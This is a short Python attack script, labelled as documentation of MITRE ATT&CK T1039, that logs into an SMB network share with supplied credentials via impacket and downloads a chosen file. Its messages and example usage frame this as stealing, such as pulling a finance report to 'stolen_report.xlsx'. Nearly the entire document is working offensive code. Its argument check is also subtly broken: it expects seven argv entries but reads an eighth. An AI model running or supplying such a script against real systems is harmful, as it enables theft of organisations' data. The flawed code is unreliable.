# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1039 - Data from Network Shared Drive
# Objective: Steal data from a network share. This script connects to a specified share
# (e.g., C$ or a departmental share) and downloads a file.

#!/usr/bin/env python3
import sys
from impacket.smbconnection import SMBConnection

def steal_from_share(target, username, password, domain, share_name, remote_file, local_path):
    try:
        print(f"[*] Attempting to steal {remote_file} from {share_name} on {target}...")
        smb_conn = SMBConnection(remoteName=target, remoteHost=target)
        smb_conn.login(username, password, domain)

        print(f"[*] Downloading {remote_file} to {local_path}")
        with open(local_path, 'wb') as f:
            smb_conn.getFile(share_name, remote_file, f.write)
        
        print(f"[+] Successfully downloaded file to {local_path}")
        smb_conn.logoff()
    except Exception as e:
        print(f"[-] Error stealing file: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 7:
        print("Usage: ./T1039_steal_from_share.py <target> <username> <password> <domain> <share_name> <remote_file> <local_path>")
        print("Example: ./T1039_steal_from_share.py 192.168.1.100 user pass CORP 'Departments$' 'Finance/Q4-Report.xlsx' './stolen_report.xlsx'")
        sys.exit(1)

    steal_from_share(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7])